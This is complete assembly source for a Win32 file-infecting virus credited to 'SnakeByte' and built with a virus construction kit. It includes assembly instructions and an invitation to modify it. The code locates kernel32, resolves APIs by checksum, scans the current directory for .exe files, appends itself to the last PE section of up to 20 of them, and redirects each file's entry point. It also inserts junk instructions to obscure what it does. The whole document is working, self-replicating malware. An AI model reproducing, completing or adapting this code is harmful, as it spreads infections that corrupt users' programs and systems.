              
;
;
; Win32.10 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.10
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/14/2016
;  Infection Mark         : 10
;  Infection Type         : increasing last section
;  API Search             : Simple CRC I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 29
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 8d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 mov edx, dword ptr [esp]
                                        ; add esp, 4
 add esp, 4d
 sub edx, offset Delta
                                        ; mov ebp, edx
 push edx
 pop ebp
 jmp KernelSearchStart


;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 cmp dword ptr [ebp+WFD_nFileSizeLow], 20000d
 jbe NoInfection
                                        ; check for maximum filesize
 lea eax, [ebp+WFD_nFileSizeHigh]

 cmp dword ptr [eax], 0
 jne NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 push dword ptr [ebp+MapAddress]
 pop ecx
                                        ; check for ZM
 cmp word ptr [ecx], 'ZM'
 je Goodfile
                                        ; mov ebx, 20412
 push 20412d
 pop ebx
 cmp ebx, 20412d
 je Notagoodfile

Goodfile:
 cmp word ptr [ecx+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
 push dword ptr [ecx+3Ch]
 pop edi
                                        ; check if header lies inside the file
 cmp edi, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add edi, ecx
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [edi], 'EP'
 je Goodfile2
                                        ; clear ebx
 mov ebx, -51110d
 add ebx, 51110d
 or ebx, ebx
 jz Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edi+4Ch], '10'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
 call InfectEXE                         ; Infect the file
 jc NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop ecx
 push ecx
                                        ; round to pages
 shr ecx, 16d
 rol ecx, 16d
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 0
 add dword ptr [ebp+K32Trys], 5h

GK1:                                    ; check for DOS-EXE Stub
 mov edx, dword ptr [ebp+K32Trys]
 cmp edx, 0h
 jz NoKernel
                                        ; check for ZM
 cmp word ptr [ecx], 'ZM'
 je CheckPE

GK2:
 add ecx, -65536d
 mov edx, dword ptr [ebp+K32Trys]
 dec edx
 mov dword ptr [ebp+K32Trys], edx
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
 mov eax, [ecx+3Ch]
 neg ecx
 sub eax, ecx
 neg ecx
                                        ; check for EP
 cmp word ptr [eax], 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:
                                        ; check if the file is a DLL
                                        ; add eax, 22
 dec eax
 add eax, 23d
                                        ; clear edx
 push 0
 pop edx
 mov dx, word ptr [eax]
 and dx, 0F000h
 cmp dx, 02000h
 je GotDLL
 jmp GK2
GotDLL:                                 ; we found a DLL file
 add eax, -22d


KernelFound:
 mov dword ptr [ebp+KernelMZ], ecx
 mov dword ptr [ebp+KernelPE], eax
                                        ; clear eax
 mov eax, 0
 add eax, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear ecx
 mov ecx, 12100d
 sub ecx, 12100d
 add ecx, [eax+78h]
 add ecx, [ebp+KernelMZ]
                                        ; add ecx, 28
 dec ecx
 add ecx, 29d
                                        ; get ATableVA
 mov eax, dword ptr [ecx]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], eax
                                        ; add ecx, 4
 add ecx, 4d
                                        ; get NTableVA
 mov eax, dword ptr [ecx]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], eax
                                        ; add ecx, 4
 add ecx, 4d
                                        ; get OTableVA
 mov eax, dword ptr [ecx]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], eax
 lea ecx, GetApis
 add ecx, ebp

 push ecx
ret


;          [ ///// * Execute Original File * \\\\\ ]

 mov ebx, 74505343d                     ; Trash
NoKernel:
                                        ; store old EIP and ImageBase
 mov ecx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 add dword ptr [ebp+retEIP], ecx

 mov ecx, dword ptr [ebp+Trash1]

 shl edx, 16d                           ; Trash
 push ecx
 pop dword ptr [ebp+Trash2]

 mov eax, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], 0
 add dword ptr [ebp+retBase], eax



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 cmp ebp, 0
 je FirstGenHost
 mov ebx,12345678h
 org $-4
 retEIP dd 0h
 add ebx,12345678h
 org $-4
 retBase dd 0h
 push ebx
ret



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
                                        ; clear ecx
 mov ecx, 5061d
 sub ecx, 5061d
 add ecx, NumberOfApis

                                        ; load API Names and Offsets
 lea edx, [ebp+APINames]
 xchg ebx, edx

 lea edx, [ebp+APIOffsets]
 xchg edi, edx


GetApisLoop: 
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h

                                        ; search 'em
                                        ; ebx points to the CRC
                                        ; edi points to the offset

 call SearchAPI1
                                        ; add ebx, 4
 add ebx, 4d
                                        ; mov eax, -1
 mov eax, ( -1d + 1d )
 sub eax, 1d
 and eax, dword ptr [ebp+TempAPI]
 mov dword ptr [edi], eax
                                        ; add edi, 4
 add edi, 4d
 loop GetApisLoop
 jmp Outbreak



;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea ebx, [ebp+WIN32_FIND_DATA]
 xchg ebx, edi

 push edi
 push ecx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
 lea eax, [ebp+WFD_szFileName]
 xchg eax, esi

                                        ; mov ecx, 276
 mov ecx, ( 276d + 31d )
 sub ecx, 31d

ClearOldData2:
 mov byte ptr [esi], 0h
                                        ; add esi, 1
 add esi, 1d
 dec ecx
 jnz ClearOldData2
 popad
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 mov edx, offset WIN32_FIND_DATA
 add edx, ebp

 push edx
 mov ecx, dword ptr [ebp+FindHandle]
 push ecx
 call dword ptr [ebp+XFindNextFileA]
ret





;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov ebx, 80000000h or 40000000h
 push ebx
 lea eax, [ebp+WFD_szFileName]
 xchg esi, eax

 push esi
 call dword ptr [ebp+XCreateFileA]

 inc eax
 jz Closed
 sub eax, 1

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov ebx, dword ptr [ebp+WFD_nFileSizeLow]
 push ebx
 or edx, ebx                            ; Trash

                                        ; clear ecx
 mov ecx, -23495d
 add ecx, 23495d
 push ecx
 push ebx
 push ecx
                                        ; mov edx, 4
 mov edx, ( 4d + 32d )
 sub edx, 32d
 push edx
 push ecx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ebx
                                        ; add eax, 1
 inc eax
 dec eax
 jz CloseFile
 add dword ptr [ebp+Trash1], 161362     ; Trash
 push ebx
 push 0
 push 0
                                        ; mov ecx, 2
 mov ecx, ( 2d xor 6d )
 xor ecx, 6d
 push ecx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 test eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], 0
 xor dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
 mov ebx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 xor edx, edx
 mov dword ptr [ebp+AlignTemp], eax
 div ebx
 sub ebx, edx
 mov eax, dword ptr [ebp+AlignTemp]
 add eax, ebx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ebx Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




 mov eax, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push eax
                                        ; clear ecx
 and ecx, 0
 add ecx, dword ptr [ebp+KernelMZ]
 add ecx, dword ptr [eax]
                                        ; mov eax, ecx
 push ecx
 pop eax
 add dword ptr [ebp+Trash1], ecx        ; Trash
                                        ; mov esi, ecx
 push ecx
 pop esi
 mov dword ptr [ebp+TempApisearch2], 0
 xor dword ptr [ebp+TempApisearch2], esi
 push ebx
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; ebx Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; simple CRC Api Search by Lethalmind
 mov edx, dword ptr [ebx]
 LoopChsksm:
                                        ; clear ecx
 mov ecx, 34061d
 sub ecx, 34061d
 mov cl, byte ptr [esi]
                                        ; add esi, 1
 inc esi
 shl cx,8d
 and dword ptr [ebp+Trash1], edx        ; Trash
 sub edx, ecx
 test cx, cx
 jz LoopConti
                                        ; clear ecx
 and ecx, 0
 mov cl, byte ptr [esi]
                                        ; add esi, 1
 sub esi, -1d
 sub edx, ecx
 or cx, cx
 jnz LoopChsksm
LoopConti:
                                        ; add edx, 1
 add edx, 1d
 dec edx
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop ebx
 pop eax
 mov esi, dword ptr [ebp+TempApisearch2]
                                        ; add eax, 4
 add eax, 4d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2002h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 pop esi
 pop esi
                                        ; retrieve the offset
 movzx ecx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 sal ecx, 1                             ; multiply with 2
 add ecx, dword ptr [ebp+OTableVA]
 push ecx
 pop esi
 movzx ecx, word ptr [esi]
 shl ecx, 2h
 add ecx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov edx, dword ptr [ecx]
 add edx, dword ptr [ebp+KernelMZ]
 push edx
 pop dword ptr [ebp+TempAPI]
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop ecx
 popad
 jmp ExecuteHost



;                  [ ///// * Data * \\\\\ ]

Data:
 FindHandle  dd 0h
 MapAddress  dd 0h
 K32Trys     dd 0h
 KernelMZ    dd 0h
 Trash2      dd 0h
 InfCounter  dd 0h

 APIOffsets:
 XCloseHandle           dd 0h
 XMapViewOfFile         dd 0h
 XCreateFileA           dd 0h
 XFindFirstFileA        dd 0h
 XCreateFileMappingA    dd 0h
 XFindClose             dd 0h
 XUnmapViewOfFile       dd 0h
 XFindNextFileA         dd 0h

 TempAPI     dd 0h
 AlignReg1   dd 0h
 AlignTemp   dd 0h
 filemask    db '*.Exe',0

 APINames:
 dd 'Cl'+'os'+'eH'+'an'+'dl'+'e'*100h
 dd 'Ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'A'*100h
 dd 'Fi'+'nd'+'Fi'+'rs'+'tF'+'il'+'eA'
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'Ma'+'pp'+'in'+'gA'
 dd 'Fi'+'nd'+'Cl'+'os'+'e'*100h
 dd 'Un'+'ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Fi'+'nd'+'Ne'+'xt'+'Fi'+'le'+'A'*100h

 counter     dw 0h
 FileHandle  dd 0h
 AlignReg2   dd 0h
 ATableVA    dd 0h
 OTableVA    dd 0h
 KernelPE    dd 0h
 db 'Win32.10 by SnakeByte',0
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 Trash1      dd 0h
 NewEIP      dd 0h
 NTableVA    dd 0h
 MapHandle   dd 0h
 OldEIP      dd 0h
 TempApisearch2 dd 0h
 OldBase     dd 400000h
 NewSize     dd 0h




;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 xor edx, ecx                           ; Trash
 mov ebx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov edx, [ebx+3Ch]
 add edx, ebx
                                        ; get File Alignment
 mov eax, [edx+3Ch]
                                        ; clear edx
 and edx, 0
 add edx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 mov dword ptr [ebp+AlignReg2], eax
 add edx, VirusSize
 mov dword ptr [ebp+AlignReg1], edx
 call Align
 mov edx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], edx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 xor dword ptr [ebp+WFD_nFileSizeLow], edx
 call CreateMap
 jc NoEXE
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ebx, dword ptr [esi+3Ch]
 add ebx, esi
                                        ; infect by increasing the last section
 push ebx
 pop esi
                                        ; get last section
 movzx edx, word ptr [esi+06h]
 sub edx, 1
 imul edx, edx, 28h
 add ebx, edx
                                        ; add ebx, 120
 dec ebx
 add ebx, 121d
 mov edx, dword ptr [esi+74h]
 clc
 rcl edx, 3
 add ebx, edx
                                        ; get old Entrypoint
 mov eax, dword ptr [esi+28h]
 push eax
 pop dword ptr [ebp+OldEIP]
 mov ecx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], -1
 and dword ptr [ebp+OldBase], ecx
                                        ; clear eax
 mov eax, 64077d
 sub eax, 64077d

 add eax, [ebx+10h]
                                        ; mov edx, eax
 push eax
 pop edx
 add ebx, 14h
 add eax, [ebx]
 sub ebx, 14h
 push eax
 mov ecx, edx
 add ebx, 0Ch
 add ecx, [ebx]
 sub ebx, 0Ch
 mov dword ptr [ebp+NewEIP], ecx
                                        ; save new enty point in file
 mov dword ptr [esi+28h], 0
 add dword ptr [esi+28h], ecx
 mov ecx, [ebx+10h]
 push ecx
                                        ; calculate new section size
 add ecx, VirusSize
 mov dword ptr [ebp+AlignReg1], ecx
 push dword ptr [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 call Align
 push dword ptr [ebp+AlignReg1]
 pop ecx
 mov dword ptr [ebx+10h], ecx
 pop ecx
 add ecx, VirusSize
 mov dword ptr [ebx+08h], ecx
 mov ecx, dword ptr [ebx+0Ch]
 add ecx, dword ptr [ebx+10h]
 mov dword ptr [esi+50h], ecx
                                        ; set write, read and code flag
 or dword ptr [ebx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], '10'
                                        ; Append Virus
 pop edi
 add edi, dword ptr [ebp+MapAddress]
 mov edx, VirusSize
 lea ebx, [ebp+Virus]
 xchg ebx, esi


AppendLoop:
 movsb
 dec edx
 jnz AppendLoop
                                        ; decrease Infection Counter
 mov eax, dword ptr [ebp+InfCounter]
 dec eax
 mov dword ptr [ebp+InfCounter], 0
 add dword ptr [ebp+InfCounter], eax
 clc
ret

NoEXE:
 stc
ret



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
                                        ; mov edx, -1
 mov edx, ( -1d + 20d )
 sub edx, 20d
 and edx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], edx

 mov edi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], edi




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 mov [ebp+InfCounter], 20d
 lea ecx, [ebp+filemask]

                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 push dword ptr [ebp+InfCounter]
 pop ebx
 sub ebx, 1
 add ebx, 1
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear ecx
 push 0
 pop ecx
 push ecx
 call ExitProcess



end FakeCode

